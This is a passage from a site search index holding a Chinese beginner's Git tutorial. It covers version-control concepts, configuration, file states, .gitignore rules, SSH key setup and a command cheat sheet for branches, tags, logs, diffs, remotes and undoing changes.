\u663e\u793a\u6307\u5b9a\u6587\u4ef6\u662f\u4ec0\u4e48\u4eba\u5728\u4ec0\u4e48\u65f6\u95f4\u4fee\u6539\u8fc7 $ git blame [ file ] # \u663e\u793a\u6682\u5b58\u533a\u548c\u5de5\u4f5c\u533a\u7684\u5dee\u5f02 $ git diff # \u663e\u793a\u6682\u5b58\u533a\u548c\u4e0a\u4e00\u4e2acommit\u7684\u5dee\u5f02 $ git diff --cached [ file ] # \u663e\u793a\u5de5\u4f5c\u533a\u4e0e\u5f53\u524d\u5206\u652f\u6700\u65b0commit\u4e4b\u95f4\u7684\u5dee\u5f02 $ git diff HEAD # \u663e\u793a\u4e24\u6b21\u63d0\u4ea4\u4e4b\u95f4\u7684\u5dee\u5f02 $ git diff [ first-branch ] ... [ second-branch ] # \u663e\u793a\u4eca\u5929\u4f60\u5199\u4e86\u591a\u5c11\u884c\u4ee3\u7801 $ git diff --shortstat \"@{0 day ago}\" # \u663e\u793a\u67d0\u6b21\u63d0\u4ea4\u7684\u5143\u6570\u636e\u548c\u5185\u5bb9\u53d8\u5316 $ git show [ commit ] # \u663e\u793a\u67d0\u6b21\u63d0\u4ea4\u53d1\u751f\u53d8\u5316\u7684\u6587\u4ef6 $ git show --name-only [ commit ] # \u663e\u793a\u67d0\u6b21\u63d0\u4ea4\u65f6\uff0c\u67d0\u4e2a\u6587\u4ef6\u7684\u5185\u5bb9 $ git show [ commit ] : [ filename ] # \u663e\u793a\u5f53\u524d\u5206\u652f\u7684\u6700\u8fd1\u51e0\u6b21\u63d0\u4ea4 $ git reflog \u8fdc\u7a0b\u540c\u6b65 \u00b6 # \u4e0b\u8f7d\u8fdc\u7a0b\u4ed3\u5e93\u7684\u6240\u6709\u53d8\u52a8 $ git fetch [ remote ] # \u663e\u793a\u6240\u6709\u8fdc\u7a0b\u4ed3\u5e93 $ git remote -v # \u663e\u793a\u67d0\u4e2a\u8fdc\u7a0b\u4ed3\u5e93\u7684\u4fe1\u606f $ git remote show [ remote ] # \u589e\u52a0\u4e00\u4e2a\u65b0\u7684\u8fdc\u7a0b\u4ed3\u5e93\uff0c\u5e76\u547d\u540d $ git remote add [ shortname ] [ url ] # \u53d6\u56de\u8fdc\u7a0b\u4ed3\u5e93\u7684\u53d8\u5316\uff0c\u5e76\u4e0e\u672c\u5730\u5206\u652f\u5408\u5e76 $ git pull [ remote ] [ branch ] # \u4e0a\u4f20\u672c\u5730\u6307\u5b9a\u5206\u652f\u5230\u8fdc\u7a0b\u4ed3\u5e93 $ git push [ remote ] [ branch ] # \u5f3a\u884c\u63a8\u9001\u5f53\u524d\u5206\u652f\u5230\u8fdc\u7a0b\u4ed3\u5e93\uff0c\u5373\u4f7f\u6709\u51b2\u7a81 $ git push [ remote ] --force # \u63a8\u9001\u6240\u6709\u5206\u652f\u5230\u8fdc\u7a0b\u4ed3\u5e93 $ git push [ remote ] --all \u64a4\u9500 \u00b6 # \u6062\u590d\u6682\u5b58\u533a\u7684\u6307\u5b9a\u6587\u4ef6\u5230\u5de5\u4f5c\u533a $ git checkout [ file ] # \u6062\u590d\u67d0\u4e2acommit\u7684\u6307\u5b9a\u6587\u4ef6\u5230\u6682\u5b58\u533a\u548c\u5de5\u4f5c\u533a $ git checkout [ commit ] [ file ] # \u6062\u590d\u6682\u5b58\u533a\u7684\u6240\u6709\u6587\u4ef6\u5230\u5de5\u4f5c\u533a $ git checkout . # \u91cd\u7f6e\u6682\u5b58\u533a\u7684\u6307\u5b9a\u6587\u4ef6\uff0c\u4e0e\u4e0a\u4e00\u6b21commit\u4fdd\u6301\u4e00\u81f4\uff0c\u4f46\u5de5\u4f5c\u533a\u4e0d\u53d8 $ git reset [ file ] # \u91cd\u7f6e\u6682\u5b58\u533a\u4e0e\u5de5\u4f5c\u533a\uff0c\u4e0e\u4e0a\u4e00\u6b21commit\u4fdd\u6301\u4e00\u81f4 $ git reset --hard # \u91cd\u7f6e\u5f53\u524d\u5206\u652f\u7684\u6307\u9488\u4e3a\u6307\u5b9acommit\uff0c\u540c\u65f6\u91cd\u7f6e\u6682\u5b58\u533a\uff0c\u4f46\u5de5\u4f5c\u533a\u4e0d\u53d8 $ git reset [ commit ] # \u91cd\u7f6e\u5f53\u524d\u5206\u652f\u7684HEAD\u4e3a\u6307\u5b9acommit\uff0c\u540c\u65f6\u91cd\u7f6e\u6682\u5b58\u533a\u548c\u5de5\u4f5c\u533a\uff0c\u4e0e\u6307\u5b9acommit\u4e00\u81f4 $ git reset --hard [ commit ] # \u91cd\u7f6e\u5f53\u524dHEAD\u4e3a\u6307\u5b9acommit\uff0c\u4f46\u4fdd\u6301\u6682\u5b58\u533a\u548c\u5de5\u4f5c\u533a\u4e0d\u53d8 $ git reset --keep [ commit ] # \u65b0\u5efa\u4e00\u4e2acommit\uff0c\u7528\u6765\u64a4\u9500\u6307\u5b9acommit # \u540e\u8005\u7684\u6240\u6709\u53d8\u5316\u90fd\u5c06\u88ab\u524d\u8005\u62b5\u6d88\uff0c\u5e76\u4e14\u5e94\u7528\u5230\u5f53\u524d\u5206\u652f $ git revert [ commit ] \u6682\u65f6\u5c06\u672a\u63d0\u4ea4\u7684\u53d8\u5316\u79fb\u9664\uff0c\u7a0d\u540e\u518d\u79fb\u5165 $ git stash $ git stash pop \u5176\u4ed6 \u00b6 # \u751f\u6210\u4e00\u4e2a\u53ef\u4f9b\u53d1\u5e03\u7684\u538b\u7f29\u5305 $ git archive","title":"Git\u5165\u95e8"},{"location":"%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Git%E5%85%A5%E9%97%A8/#git","text":"","title":"Git\u5165\u95e8"},{"location":"%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Git%E5%85%A5%E9%97%A8/#_1","text":"","title":"\u7248\u672c\u63a7\u5236"},{"location":"%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Git%E5%85%A5%E9%97%A8/#_2","text":"\u6bcf\u4e2a\u6587\u4ef6\u4e00\u4e2a\u5feb\u7167\uff0c\u4e2a\u4eba\u7528\uff0c\u5982RCS","title":"\u672c\u5730\u7248\u672c\u63a7\u5236"},{"location":"%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Git%E5%85%A5%E9%97%A8/#_3","text":"\u6240\u6709\u7248\u672c\u4fdd\u5b58\u5728\u670d\u52a1\u5668\u4e0a\uff0c\u534f\u540c\u5f00\u53d1\u8005\u4ece\u670d\u52a1\u5668\u4e0a\u540c\u6b65\u66f4\u65b0\u6216\u8005\u4fee\u6539\u4e0a\u4f20 \u5982\u679c\u7528\u6237\u4e0d\u8054\u7f51\uff0c\u5c31\u770b\u4e0d\u5230\u5386\u53f2\u7248\u672c\uff1b\u5982\u679c\u670d\u52a1\u5668\u635f\u574f\uff0c\u5c31\u4f1a\u4e22\u5931\u6240\u6709\u6570\u636e \u4ee3\u8868\u4ea7\u54c1\uff1aSVN\u3001CVS\u3001VSS","title":"\u96c6\u4e2d\u7248\u672c\u63a7\u5236"},{"location":"%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Git%E5%85%A5%E9%97%A8/#_4","text":"\u6240\u6709\u7248\u672c\u4fe1\u606f\u5168\u90e8\u540c\u6b65\u5230\u6bcf\u4e2a\u7528\u6237\u672c\u5730\uff0c\u6240\u6709\u53ef\u4ee5\u79bb\u7ebf\u67e5\u770b\u5386\u53f2\u6570\u636e\uff1b\u53ea\u8981\u6709\u4e00\u4e2a\u7528\u6237\u8bbe\u5907\u6ca1\u95ee\u9898\uff0c\u5c31\u53ef\u4ee5\u6062\u590d\u6240\u6709\u6570\u636e \u4ee3\u8868\u4ea7\u54c1\uff1aGit","title":"\u5206\u5e03\u5f0f\u7248\u672c\u63a7\u5236"},{"location":"%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Git%E5%85%A5%E9%97%A8/#_5","text":"\u53bb \u5b98\u7f51 \uff0c\u6216\u8005\u955c\u50cf\u7ad9\u4e0b\u8f7d \u4e3a\u65b9\u4fbf\u4f7f\u7528\uff0c\u53ef\u589e\u52a0\u73af\u5883\u53d8\u91cf \u5b89\u88c5\u8def\u5f84\\Git\\cmd","title":"\u73af\u5883\u914d\u7f6e"},{"location":"%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Git%E5%85%A5%E9%97%A8/#_6","text":"","title":"\u57fa\u672c\u547d\u4ee4"},{"location":"%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Git%E5%85%A5%E9%97%A8/#git_1","text":"\u67e5\u770b\u914d\u7f6e git config -l \u53ea\u770b\u7cfb\u7edf\u81ea\u5e26\u914d\u7f6e git config --system --list \u53ea\u770b\u7528\u6237\u81ea\u5df1\u914d\u7684\u914d\u7f6e git config --global --list \u914d\u7f6e\u6587\u4ef6\u8def\u5f84\uff1a Git\\etc\\gitconfig\uff1aGit\u5b89\u88c5\u76ee\u5f55\u4e0bgitconfig --system C:\\Users\\xxxx.gitconfig\uff1a\u5f53\u524d\u767b\u5f55\u7528\u6237\u914d\u7f6e --global \u8bbe\u7f6e\u7528\u6237\u540d\u4e0e\u90ae\u7bb1\uff08\u5fc5\u987b\uff09\uff1a git config --global user.name \"F1rstb100d\" git config --global user.email \"123456@qq.com\"","title":"Git\u914d\u7f6e"},{"location":"%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Git%E5%85%A5%E9%97%A8/#git_2","text":"Git\u672c\u5730\u6709\u4e09\u4e2a\u5de5\u4f5c\u533a\uff1a\u5de5\u4f5c\u76ee\u5f55\uff08Working Directory\uff09\u3001\u6682\u5b58\u533a\uff08Stage/Index\uff09\u3001\u8d44\u6e90\u5e93\uff08Repository\uff09 \u4ee5\u53ca\u7b2c\u56db\u4e2a\u5de5\u4f5c\u533a\uff1a\u8fdc\u7a0b\u7684git\u4ed3\u5e93\uff08Remote Directory\uff09 Workspace\uff1a\u5de5\u4f5c\u533a\uff0c\u5b58\u653e\u4ee3\u7801 Index / Stage\uff1a\u6682\u5b58\u533a\uff0c\u4e34\u65f6\u5b58\u653e\u6539\u52a8\uff0c\u672c\u8d28\u662f\u4e00\u4e2a\u6587\u4ef6 Repository\uff1a\u672c\u5730\u4ed3\u5e93\uff0c\u6240\u6709\u63d0\u4ea4\u7684\u6570\u636e\uff0cHEAD\u6307\u5411\u6700\u65b0\u653e\u5165\u4ed3\u5e93\u7684\u7248\u672c Remote\uff1a\u8fdc\u7a0b\u4ed3\u5e93\uff0c\u6258\u7ba1\u4ee3\u7801\u7684\u670d\u52a1\u5668","title":"Git\u57fa\u672c\u7406\u8bba"},{"location":"%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Git%E5%85%A5%E9%97%A8/#git_3","text":"\u5728\u5de5\u4f5c\u76ee\u5f55\u6dfb\u52a0\u3001\u4fee\u6539\u6587\u4ef6 \u5c06\u9700\u8981\u8fdb\u884c\u7248\u672c\u7ba1\u7406\u7684\u6587\u4ef6\u653e\u5165\u6682\u5b58\u533a \u5c06\u6682\u5b58\u533a\u7684\u6587\u4ef6\u63d0\u4ea4\u5230git\u4ed3\u5e93 git\u7ba1\u7406\u7684\u6587\u4ef6\u6709\u4e09\u79cd\u72b6\u6001\uff1a\u5df2\u4fee\u6539\uff08modified\uff09\u3001\u5df2\u6682\u5b58\uff08staged\uff09\u3001\u5df2\u63d0\u4ea4\uff08committed\uff09","title":"Git\u5de5\u4f5c\u6d41\u7a0b"},{"location":"%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Git%E5%85%A5%E9%97%A8/#git_4","text":"\u65e5\u5e38\u4f7f\u7528\u547d\u4ee4\uff1a","title":"Git\u9879\u76ee\u642d\u5efa"},{"location":"%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Git%E5%85%A5%E9%97%A8/#_7","text":"\u9996\u5148\u521d\u59cb\u5316\u4ed3\u5e93\uff1a git init \u5728\u5f53\u524d\u76ee\u5f55\u591a\u4e00\u4e2a.git\u6587\u4ef6\u5939\uff0c\u7248\u672c\u63a7\u5236\u4fe1\u606f\u90fd\u5728\u91cc\u9762","title":"\u672c\u5730\u4ed3\u5e93\u642d\u5efa"},{"location":"%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Git%E5%85%A5%E9%97%A8/#_8","text":"\u76f4\u63a5\u514b\u9686\u73b0\u6709\u7684\u4ed3\u5e93\u5230\u672c\u5730\uff1a git clone [url]","title":"\u514b\u9686\u8fdc\u7a0b\u4ed3\u5e93"},{"location":"%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Git%E5%85%A5%E9%97%A8/#git_5","text":"","title":"Git\u6587\u4ef6\u64cd\u4f5c"},{"location":"%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Git%E5%85%A5%E9%97%A8/#4","text":"Untracked\uff1a\u672a\u8ddf\u8e2a\uff0c\u867d\u5728\u6587\u4ef6\u5939\u4e2d\uff0c\u4f46\u672a\u6dfb\u52a0\u5230git\u7248\u672c\u63a7\u5236\uff0c\u901a\u8fc7 git add \u72b6\u6001\u53d8\u4e3a Staged Unmodify\uff1a\u6587\u4ef6\u5df2\u5165\u5e93\u672a\u4fee\u6539\uff0c\u82e5\u4fee\u6539\u5219\u53d8\u4e3a Modified \uff0c\u82e5\u4f7f\u7528 git rm \u79fb\u51fa\u7248\u672c\u5e93\uff0c\u5219\u53d8\u4e3a Untracked Modified\uff1a\u6587\u4ef6\u5df2\u4fee\u6539\uff0c\u901a\u8fc7 git add \u8fdb\u5165\u6682\u5b58\u72b6\u6001 Staged \uff0c\u4f7f\u7528 git checkout \u4e22\u5f03\u4fee\u6539\uff0c\u56de\u5230 Unmodify \u72b6\u6001 Staged\uff1a\u6682\u5b58\u72b6\u6001\uff0c\u6267\u884c git commit \u5c06\u4fee\u6539\u540c\u6b65\u5230\u5e93\u4e2d\uff0c\u6587\u4ef6\u53d8\u4e3a Unmodify \u72b6\u6001\uff0c\u6267\u884c git reset HEAD filename \u53d6\u6d88\u6682\u5b58\uff0c\u6587\u4ef6\u53d8\u4e3a Modified","title":"\u6587\u4ef6\u76844\u79cd\u72b6\u6001"},{"location":"%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Git%E5%85%A5%E9%97%A8/#_9","text":"git status [ filename ] #\u67e5\u770b\u6307\u5b9a\u6587\u4ef6\u72b6\u6001 git status #\u67e5\u770b\u6240\u6709\u6587\u4ef6\u72b6\u6001","title":"\u67e5\u770b\u6587\u4ef6\u72b6\u6001"},{"location":"%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Git%E5%85%A5%E9%97%A8/#_10","text":"\u5982\u679c\u6709\u4e9b\u6587\u4ef6\u6211\u4eec\u4e0d\u60f3\u8ba9\u4ed6\u52a0\u5165\u7248\u672c\u63a7\u5236\u3002 \u5728\u4e3b\u76ee\u5f55\u4e0b\u5efa\u7acb .gitignore \u6587\u4ef6\uff0c\u6709\u5982\u4e0b\u89c4\u5219\uff1a \u5ffd\u7565\u6587\u4ef6\u7a7a\u884c\u4ee5\u53ca # \u5f00\u5934\u7684\u884c \u53ef\u4ee5\u4f7f\u7528Linux\u901a\u914d\u7b26\uff08 * \u4ee3\u8868\u591a\u4e2a\u5b57\u7b26\uff0c ? \u4ee3\u8868\u4e00\u4e2a\u5b57\u7b26\uff0c [abc] \u4ee3\u8868\u53ef\u9009\u5b57\u7b26\uff09 \u6700\u524d\u9762\u6709\u4e00\u4e2a ! \uff0c\u8868\u793a\u4f8b\u5916\u89c4\u5219\uff0c\u5c06\u4e0d\u88ab\u5ffd\u7565 \u6700\u524d\u662f\u5206\u9694\u7b26 / \uff0c\u8868\u793a\u5ffd\u7565\u6839\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\u5939\uff0c\u5176\u4ed6\u8def\u5f84\u4e0b\u8be5\u6587\u4ef6\u540d\u4e0d\u5ffd\u7565 \u6700\u540e\u662f\u5206\u9694\u7b26 / \uff0c\u8868\u793a\u65e0\u8bba\u662f\u5426\u5728\u6839\u76ee\u5f55\uff0c\u5747\u5ffd\u7565\u8be5\u6587\u4ef6\u5939 #\u4e3a\u6ce8\u91ca *.txt #\u5ffd\u7565\u6240\u6709\u4ee5.txt\u7ed3\u5c3e\u7684\u6587\u4ef6 !lib.txt #lib.txt\u4e0d\u88ab\u5ffd\u7565 /temp #\u4ec5\u5ffd\u7565\u6839\u76ee\u5f55\u4e0btemp\u6587\u4ef6\u5939\uff0c\u4e0d\u5305\u62ec\u5176\u4ed6\u76ee\u5f55\u4e0b\u7684temp\u6587\u4ef6\u5939 build/ #\u5ffd\u7565\u6240\u6709build\u76ee\u5f55\u4e0b\u6587\u4ef6 doc/*.txt #\u4ec5\u5ffd\u7565\u6240\u6709doc\u6587\u4ef6\u5939\u4e2d\u4ee5.txt\u7ed3\u5c3e\u7684\u6587\u4ef6","title":"\u5ffd\u7565\u6587\u4ef6"},{"location":"%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Git%E5%85%A5%E9%97%A8/#git_6","text":"\u9996\u5148\u9700\u8981\u6ce8\u518cGithub\u6216\u8005Gitee \u7136\u540e\u8bbe\u7f6e\u672c\u673aSSH\u516c\u94a5\uff0c\u5b9e\u73b0\u514d\u5bc6\u7801\u767b\u5f55 ssh-keygen -t rsa #\u67e5\u770bC:\\User\\xxxx\\.ssh\u76ee\u5f55\u4e0b\u751f\u6210\u7684\u6587\u4ef6\uff08id_rsa\u3001id_rsa.pub\uff09 \u5c06\u516c\u94a5\u4fe1\u606f\uff08id_rsa.pub\uff09\u6dfb\u52a0\u5230github\u8d26\u6237\u4e2d \u7136\u540e\u5c31\u53ef\u4ee5\u628a\u8fdc\u7a0b\u4ed3\u5e93\u548c\u672c\u5730\u7ed1\u5b9a\u4e86","title":"\u7ed1\u5b9a\u8fdc\u7a0bGit"},{"location":"%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Git%E5%85%A5%E9%97%A8/#git_7","text":"\u5e38\u7528\u6307\u4ee4\uff1a git branch #\u5217\u51fa\u6240\u6709\u672c\u5730\u5206\u652f git branch -r #\u5217\u51fa\u6240\u6709\u8fdc\u7a0b\u5206\u652f git branch [ branch-name ] #\u65b0\u5efa\u4e00\u4e2a\u5206\u652f\uff0c\u4f46\u4ecd\u4fdd\u7559\u5728\u5f53\u524d\u5206\u652f git checkout -b [ branch ] #\u65b0\u5efa\u4e00\u4e2a\u5206\u652f\uff0c\u5e76\u5207\u6362\u5230\u8be5\u5206\u652f git merge [ branch ] #\u5408\u5e76\u6307\u5b9a\u5206\u652f\u5230\u5f53\u524d\u5206\u652f git branch -d [ branch-name ] #\u5220\u9664\u5206\u652f #\u5220\u9664\u8fdc\u7a0b\u5206\u652f git push origin --delete [ branch-name ] git branch -dr [ remote/branch ] \u5982\u679c\u540c\u4e00\u4e2a\u6587\u4ef6\u5728\u5408\u5e76\u5206\u652f\u65f6\u90fd\u88ab\u4fee\u6539\u5219\u4f1a\u5f15\u8d77**\u51b2\u7a81** \u89e3\u51b3\u65b9\u6cd5\u662f\u4fee\u6539\u51b2\u7a81\u6587\u4ef6\uff08\u9009\u62e9\u4fdd\u7559\u54ea\u4e00\u4efd\uff09\u540e\u91cd\u65b0\u63d0\u4ea4 \u4e00\u822c\u5728dev\u5206\u652f\u5408\u5e76\u5230\u7a33\u5b9a\u540e\u518d\u5408\u5e76\u5230\u4e3b\u5206\u652fmaster\u4e0a","title":"Git\u5206\u652f"},{"location":"%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Git%E5%85%A5%E9%97%A8/#_11","text":"\u53c2\u8003\uff1a https://gitee.com/all-about-git","title":"\u5907\u5fd8\u5f55"},{"location":"%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Git%E5%85%A5%E9%97%A8/#_12","text":"# \u5728\u5f53\u524d\u76ee\u5f55\u65b0\u5efa\u4e00\u4e2aGit\u4ee3\u7801\u5e93 $ git init # \u65b0\u5efa\u4e00\u4e2a\u76ee\u5f55\uff0c\u5c06\u5176\u521d\u59cb\u5316\u4e3aGit\u4ee3\u7801\u5e93 $ git init [ project-name ] # \u4e0b\u8f7d\u4e00\u4e2a\u9879\u76ee\u548c\u5b83\u7684\u6574\u4e2a\u4ee3\u7801\u5386\u53f2 $ git clone [ url ]","title":"\u4ed3\u5e93"},{"location":"%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Git%E5%85%A5%E9%97%A8/#_13","text":"# \u663e\u793a\u5f53\u524d\u7684Git\u914d\u7f6e $ git config --list # \u7f16\u8f91Git\u914d\u7f6e\u6587\u4ef6 $ git config -e [ --global ] # \u8bbe\u7f6e\u63d0\u4ea4\u4ee3\u7801\u65f6\u7684\u7528\u6237\u4fe1\u606f $ git config [ --global ] user.name \"[name]\" $ git config [ --global ] user.email \"[email address]\"","title":"\u914d\u7f6e"},{"location":"%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Git%E5%85%A5%E9%97%A8/#_14","text":"# \u6dfb\u52a0\u6307\u5b9a\u6587\u4ef6\u5230\u6682\u5b58\u533a $ git add [ file1 ] [ file2 ] ... # \u6dfb\u52a0\u6307\u5b9a\u76ee\u5f55\u5230\u6682\u5b58\u533a\uff0c\u5305\u62ec\u5b50\u76ee\u5f55 $ git add [ dir ] # \u6dfb\u52a0\u5f53\u524d\u76ee\u5f55\u7684\u6240\u6709\u6587\u4ef6\u5230\u6682\u5b58\u533a $ git add . # \u6dfb\u52a0\u6bcf\u4e2a\u53d8\u5316\u524d\uff0c\u90fd\u4f1a\u8981\u6c42\u786e\u8ba4 # \u5bf9\u4e8e\u540c\u4e00\u4e2a\u6587\u4ef6\u7684\u591a\u5904\u53d8\u5316\uff0c\u53ef\u4ee5\u5b9e\u73b0\u5206\u6b21\u63d0\u4ea4 $ git add -p # \u5220\u9664\u5de5\u4f5c\u533a\u6587\u4ef6\uff0c\u5e76\u4e14\u5c06\u8fd9\u6b21\u5220\u9664\u653e\u5165\u6682\u5b58\u533a $ git rm [ file1 ] [ file2 ] ... # \u505c\u6b62\u8ffd\u8e2a\u6307\u5b9a\u6587\u4ef6\uff0c\u4f46\u8be5\u6587\u4ef6\u4f1a\u4fdd\u7559\u5728\u5de5\u4f5c\u533a $ git rm --cached [ file ] # \u6539\u540d\u6587\u4ef6\uff0c\u5e76\u4e14\u5c06\u8fd9\u4e2a\u6539\u540d\u653e\u5165\u6682\u5b58\u533a $ git mv [ file-original ] [ file-renamed ]","title":"\u589e\u52a0/\u5220\u9664\u6587\u4ef6"},{"location":"%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Git%E5%85%A5%E9%97%A8/#_15","text":"# \u63d0\u4ea4\u6682\u5b58\u533a\u5230\u4ed3\u5e93\u533a $ git commit -m [ message ] # \u63d0\u4ea4\u6682\u5b58\u533a\u7684\u6307\u5b9a\u6587\u4ef6\u5230\u4ed3\u5e93\u533a $ git commit [ file1 ] [ file2 ] ... -m [ message ] # \u63d0\u4ea4\u5de5\u4f5c\u533a\u81ea\u4e0a\u6b21commit\u4e4b\u540e\u7684\u53d8\u5316\uff0c\u76f4\u63a5\u5230\u4ed3\u5e93\u533a $ git commit -a # \u63d0\u4ea4\u65f6\u663e\u793a\u6240\u6709diff\u4fe1\u606f $ git commit -v # \u4f7f\u7528\u4e00\u6b21\u65b0\u7684commit\uff0c\u66ff\u4ee3\u4e0a\u4e00\u6b21\u63d0\u4ea4 # \u5982\u679c\u4ee3\u7801\u6ca1\u6709\u4efb\u4f55\u65b0\u53d8\u5316\uff0c\u5219\u7528\u6765\u6539\u5199\u4e0a\u4e00\u6b21commit\u7684\u63d0\u4ea4\u4fe1\u606f $ git commit --amend -m [ message ] # \u91cd\u505a\u4e0a\u4e00\u6b21commit\uff0c\u5e76\u5305\u62ec\u6307\u5b9a\u6587\u4ef6\u7684\u65b0\u53d8\u5316 $ git commit --amend [ file1 ] [ file2 ] ...","title":"\u4ee3\u7801\u63d0\u4ea4"},{"location":"%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Git%E5%85%A5%E9%97%A8/#_16","text":"# \u5217\u51fa\u6240\u6709\u672c\u5730\u5206\u652f $ git branch # \u5217\u51fa\u6240\u6709\u8fdc\u7a0b\u5206\u652f $ git branch -r # \u5217\u51fa\u6240\u6709\u672c\u5730\u5206\u652f\u548c\u8fdc\u7a0b\u5206\u652f $ git branch -a # \u65b0\u5efa\u4e00\u4e2a\u5206\u652f\uff0c\u4f46\u4f9d\u7136\u505c\u7559\u5728\u5f53\u524d\u5206\u652f $ git branch [ branch-name ] # \u65b0\u5efa\u4e00\u4e2a\u5206\u652f\uff0c\u5e76\u5207\u6362\u5230\u8be5\u5206\u652f $ git checkout -b [ branch ] # \u65b0\u5efa\u4e00\u4e2a\u5206\u652f\uff0c\u6307\u5411\u6307\u5b9acommit $ git branch [ branch ] [ commit ] # \u65b0\u5efa\u4e00\u4e2a\u5206\u652f\uff0c\u4e0e\u6307\u5b9a\u7684\u8fdc\u7a0b\u5206\u652f\u5efa\u7acb\u8ffd\u8e2a\u5173\u7cfb $ git branch --track [ branch ] [ remote-branch ] # \u5207\u6362\u5230\u6307\u5b9a\u5206\u652f\uff0c\u5e76\u66f4\u65b0\u5de5\u4f5c\u533a $ git checkout [ branch-name ] # \u5207\u6362\u5230\u4e0a\u4e00\u4e2a\u5206\u652f $ git checkout - # \u5efa\u7acb\u8ffd\u8e2a\u5173\u7cfb\uff0c\u5728\u73b0\u6709\u5206\u652f\u4e0e\u6307\u5b9a\u7684\u8fdc\u7a0b\u5206\u652f\u4e4b\u95f4 $ git branch --set-upstream [ branch ] [ remote-branch ] # \u5408\u5e76\u6307\u5b9a\u5206\u652f\u5230\u5f53\u524d\u5206\u652f $ git merge [ branch ] # \u9009\u62e9\u4e00\u4e2acommit\uff0c\u5408\u5e76\u8fdb\u5f53\u524d\u5206\u652f $ git cherry-pick [ commit ] # \u5220\u9664\u5206\u652f $ git branch -d [ branch-name ] # \u5220\u9664\u8fdc\u7a0b\u5206\u652f $ git push origin --delete [ branch-name ] $ git branch -dr [ remote/branch ]","title":"\u5206\u652f"},{"location":"%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Git%E5%85%A5%E9%97%A8/#_17","text":"# \u5217\u51fa\u6240\u6709tag $ git tag # \u65b0\u5efa\u4e00\u4e2atag\u5728\u5f53\u524dcommit $ git tag [ tag ] # \u65b0\u5efa\u4e00\u4e2atag\u5728\u6307\u5b9acommit $ git tag [ tag ] [ commit ] # \u5220\u9664\u672c\u5730tag $ git tag -d [ tag ] # \u5220\u9664\u8fdc\u7a0btag $ git push origin :refs/tags/ [ tagName ] # \u67e5\u770btag\u4fe1\u606f $ git show [ tag ] # \u63d0\u4ea4\u6307\u5b9atag $ git push [ remote ] [ tag ] # \u63d0\u4ea4\u6240\u6709tag $ git push [ remote ] --tags # \u65b0\u5efa\u4e00\u4e2a\u5206\u652f\uff0c\u6307\u5411\u67d0\u4e2atag $ git checkout -b [ branch ] [ tag ]","title":"\u6807\u7b7e"},{"location":"%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Git%E5%85%A5%E9%97%A8/#_18","text":"# \u663e\u793a\u6709\u53d8\u66f4\u7684\u6587\u4ef6 $ git status # \u663e\u793a\u5f53\u524d\u5206\u652f\u7684\u7248\u672c\u5386\u53f2 $ git log # \u663e\u793acommit\u5386\u53f2\uff0c\u4ee5\u53ca\u6bcf\u6b21commit\u53d1\u751f\u53d8\u66f4\u7684\u6587\u4ef6 $ git log --stat # \u641c\u7d22\u63d0\u4ea4\u5386\u53f2\uff0c\u6839\u636e\u5173\u952e\u8bcd $ git log -S [ keyword ] # \u663e\u793a\u67d0\u4e2acommit\u4e4b\u540e\u7684\u6240\u6709\u53d8\u52a8\uff0c\u6bcf\u4e2acommit\u5360\u636e\u4e00\u884c $ git log [ tag ] HEAD --pretty = format:%s # \u663e\u793a\u67d0\u4e2acommit\u4e4b\u540e\u7684\u6240\u6709\u53d8\u52a8\uff0c\u5176\"\u63d0\u4ea4\u8bf4\u660e\"\u5fc5\u987b\u7b26\u5408\u641c\u7d22\u6761\u4ef6 $ git log [ tag ] HEAD --grep feature # \u663e\u793a\u67d0\u4e2a\u6587\u4ef6\u7684\u7248\u672c\u5386\u53f2\uff0c\u5305\u62ec\u6587\u4ef6\u6539\u540d $ git log --follow [ file ] $ git whatchanged [ file ] # \u663e\u793a\u6307\u5b9a\u6587\u4ef6\u76f8\u5173\u7684\u6bcf\u4e00\u6b21diff $ git log -p [ file ] # \u663e\u793a\u8fc7\u53bb5\u6b21\u63d0\u4ea4 $ git log -5 --pretty --oneline # \u663e\u793a\u6240\u6709\u63d0\u4ea4\u8fc7\u7684\u7528\u6237\uff0c\u6309\u63d0\u4ea4\u6b21\u6570\u6392\u5e8f $ git shortlog -sn # \u663e\u793a\u6307\u5b9a\u6587\u4ef6\u662f\u4ec0\u4e48\u4eba\u5728\u4ec0\u4e48\u65f6\u95f4\u4fee\u6539\u8fc7 $ git blame [ file ] # \u663e\u793a\u6682\u5b58\u533a\u548c\u5de5\u4f5c\u533a\u7684\u5dee\u5f02 $ git diff # \u663e\u793a\u6682\u5b58\u533a\u548c\u4e0a\u4e00\u4e2acommit\u7684\u5dee\u5f02 $ git diff --cached [ file ] # \u663e\u793a\u5de5\u4f5c\u533a\u4e0e\u5f53\u524d\u5206\u652f\u6700\u65b0commit\u4e4b\u95f4\u7684\u5dee\u5f02 $ git diff HEAD # 